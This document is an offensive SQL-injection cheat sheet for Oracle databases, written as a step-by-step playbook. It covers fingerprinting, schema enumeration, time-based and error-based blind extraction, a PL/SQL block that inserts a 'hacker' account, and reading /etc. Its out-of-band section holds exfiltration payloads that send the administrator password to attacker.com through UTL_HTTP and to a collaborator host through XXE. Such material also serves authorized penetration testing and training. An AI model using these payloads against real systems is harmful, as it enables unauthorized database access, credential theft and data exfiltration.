# Per-DBMS Reference — Oracle

## When this applies

- DBMS fingerprint indicates Oracle. Quick check:
  ```sql
  ' UNION SELECT NULL FROM dual--
  ' AND (SELECT 'a' FROM dual)='a'--
  SELECT banner FROM v$version
  ```
- Errors prefixed `ORA-NNNNN` confirm Oracle.

## Technique

Oracle has the strictest SQL dialect: every `SELECT` requires a `FROM` clause (use `dual` for literals); table/column names stored UPPERCASE; comment is `--`; concat is `||`. No native stacked queries (use PL/SQL `BEGIN...END` blocks instead). Time delay via `dbms_pipe.receive_message`. OAST via XML/HTTP packages.

## Steps

### Comment syntax

```sql
--          # Single-line
/*...*/     # Multi-line
```

### Concatenation

```sql
'foo' || 'bar'                 # 'foobar'
CONCAT('foo', 'bar')           # only 2 args; nest for more
```

### `FROM dual` is mandatory

Every `SELECT` without a real source table needs:

```sql
SELECT 'abc' FROM dual                    -- literal SELECT
SELECT @@version FROM dual                -- doesn't work (Oracle has no @@version)
SELECT banner FROM v$version              -- correct version query
```

### Version / current user

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
SELECT user FROM dual
SELECT ora_database_name FROM dual
```

### Schema enumeration (table/column names UPPERCASE)

```sql
SELECT DISTINCT owner FROM all_tables
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables                       -- only your own
SELECT column_name FROM all_tab_columns WHERE table_name='USERS_ABCDEF'
```

Note: when matching table_name, must be UPPERCASE (`'USERS'` not `'users'`).

### Time delay

```sql
'||(SELECT dbms_pipe.receive_message('a',10) FROM dual)||'
```

`dbms_pipe.receive_message` blocks for the specified seconds when the pipe doesn't exist.

```sql
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message('a',10) ELSE NULL END FROM dual)||'
```

Alternative when `dbms_pipe` is locked down:
```sql
SELECT COUNT(*) FROM all_users T1, all_users T2, all_users T3, all_users T4   -- CPU-bound
```

### Error-based extraction

```sql
' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--
' AND 1=TO_NUMBER((SELECT password FROM users WHERE username='admin'))--
```

Error: `ORA-01722: invalid number` (with the offending value embedded if verbose errors enabled).

### Conditional error (CASE + division by zero)

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Returns `ORA-01476: divisor is equal to zero` only when condition is true → boolean oracle for blind extraction.

### Substring / length

```sql
SUBSTR(s, p, l)                # Oracle uses SUBSTR (no -ING)
LENGTH(s)
ROWNUM = N                     # Oracle's pagination idiom (no LIMIT clause)
```

### No stacked queries — use PL/SQL block

```sql
'; BEGIN INSERT INTO users VALUES ('hacker','password123'); END;--
```

### Out-of-band via XML/HTTP packages

```sql
-- XXE-style via EXTRACTVALUE (most common, requires XML privileges)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR/"> %remote;]>'),'/l') FROM dual

-- UTL_HTTP (commonly revoked)
SELECT UTL_HTTP.REQUEST('http://attacker.com/?d=' || (SELECT password FROM users WHERE username='admin')) FROM dual

-- DBMS_LDAP (LDAP outbound)
SELECT DBMS_LDAP.INIT('attacker.com',389) FROM dual
```

### Out-of-band data exfiltration

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.COLLABORATOR/">+%remote;]>'),'/l')+FROM+dual--
```

### File operations

```sql
-- Read (requires CREATE ANY DIRECTORY or DBA)
CREATE DIRECTORY ext_dir AS '/etc';
SELECT UTL_FILE.GET_LINE(...) FROM dual;

-- Java-stored procedure for OS command (Oracle 11g+)
-- requires JAVA permission grants
```

### Privilege check

```sql
SELECT * FROM session_privs
SELECT * FROM dba_role_privs WHERE grantee = USER
SELECT * FROM user_role_privs
```

### Variants / aliases

```sql
||      → string concatenation
NVL()   → COALESCE-equivalent (NULL replacement)
DUAL    → mandatory dummy table for literal SELECTs
ROWNUM  → row position (use instead of LIMIT/OFFSET)
```

## Verifying success

- `SELECT banner FROM v$version` returns lines like `Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production`.
- `dbms_pipe.receive_message('a',10)` reliably delays the response.
- `EXTRACTVALUE(xmltype('<!DOCTYPE root [...]>'))` triggers Burp Collaborator hit.

## Common pitfalls

- Forgetting `FROM dual` in literal SELECTs causes `ORA-00923: FROM keyword not found where expected` — looks like injection failed but it's actually executing.
- Table names are case-sensitive when stored in metadata (`'USERS'` ≠ `'users'`).
- `LIMIT` doesn't exist — use `WHERE ROWNUM=1` or `FETCH FIRST 1 ROWS ONLY` (12c+).
- Many out-of-band packages (`UTL_HTTP`, `DBMS_LDAP`) are revoked from PUBLIC after Oracle hardening — XML EXTRACTVALUE often the only remaining channel.
- `dbms_pipe.receive_message` requires execute privilege — frequently revoked. Fall back to CPU-bound tautology for time-based blind.
- Comments `--` work but Oracle is finicky about whitespace around `--` in some drivers — try `;--` and `/* */`.

## Tools

- sqlmap `--dbms=Oracle` for automated extraction.
- SQL*Plus / SQLcl for sandbox testing.
- ODAT (Oracle Database Attacking Tool) for credential brute-forcing and post-exploitation.
